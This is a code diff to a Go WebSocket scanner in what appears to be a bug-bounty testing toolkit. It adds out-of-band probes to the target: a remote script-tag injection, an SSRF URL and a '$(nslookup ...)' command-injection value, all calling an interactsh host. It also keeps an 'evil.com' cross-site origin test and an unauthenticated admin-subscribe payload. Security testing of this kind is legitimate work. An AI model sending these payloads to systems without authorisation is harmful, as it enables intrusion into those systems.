@@ -1,11 +1,11 @@
 package tools
 
 import (
-	"github.com/Developer-Army/BBPTS/internal/domain/recon"
 	"bufio"
 	"context"
 	"crypto/tls"
 	"fmt"
+	"github.com/Developer-Army/BBPTS/internal/domain/recon"
 	"io"
 	"net"
 	"net/http"
@@ -58,18 +58,22 @@ func (t *WebSocketTool) Run(ctx context.Context, scanCtx *recon.ScanContext, tar
 
 		var events []recon.Event
 
-		// Test 1: Missing Origin Validation (CSWSH)
-		vuln, detail, checkErr := t.checkCSWSH(ctx, parsed, "http://evil.com")
+		evilOrigin := "http://evil.com"
+		if oobURL := scanCtx.InteractshOOBURL; oobURL != "" {
+			oobHost := strings.TrimPrefix(strings.TrimPrefix(oobURL, "https://"), "http://")
+			evilOrigin = "https://" + oobHost
+		}
+
+		vuln, detail, checkErr := t.checkCSWSH(ctx, parsed, evilOrigin)
 		if checkErr == nil && vuln {
 			events = append(events, recon.NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
 				"vuln_name":   "Cross-Site WebSocket Hijacking (CSWSH)",
 				"severity":    "high",
-				"origin":      "http://evil.com",
-				"description": fmt.Sprintf("WebSocket endpoint at %s accepted connection upgraded with an external Origin header (http://evil.com). Detail: %s", target, detail),
+				"origin":      evilOrigin,
+				"description": fmt.Sprintf("WebSocket endpoint at %s accepted connection upgraded with external Origin: %s. Detail: %s", target, evilOrigin, detail),
 			}, "high"))
 		}
 
-		// Test 2: Unauthenticated message injection to privileged channel.
 		injected, detail, checkErr := t.checkUnauthenticatedAdminSubscribe(ctx, parsed)
 		if checkErr == nil && injected {
 			events = append(events, recon.NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
@@ -78,6 +82,23 @@ func (t *WebSocketTool) Run(ctx context.Context, scanCtx *recon.ScanContext, tar
 				"payload":     `{"action":"subscribe","channel":"admin"}`,
 				"description": fmt.Sprintf("WebSocket endpoint at %s returned data after an unauthenticated admin channel subscription. Detail: %s", target, detail),
 			}, "high"))
+		}
+
+		if oobURL := scanCtx.InteractshOOBURL; oobURL != "" {
+			oobHost := strings.TrimPrefix(strings.TrimPrefix(oobURL, "https://"), "http://")
+			oobPayloads := []string{
+				fmt.Sprintf(`{"message":"<script src=https://%s/ws.js></script>"}`, oobHost),
+				fmt.Sprintf(`{"url":"http://%s/ssrf"}`, oobHost),
+				fmt.Sprintf(`{"query":"$(nslookup %s)"}`, oobHost),
+			}
+			for _, oobPayload := range oobPayloads {
+				conn, _, connErr := t.openWebSocket(ctx, parsed, "")
+				if connErr != nil {
+					break
+				}
+				_ = writeWebSocketTextFrame(conn, oobPayload)
+				conn.Close()
+			}
 		}
 
 		return events, nil
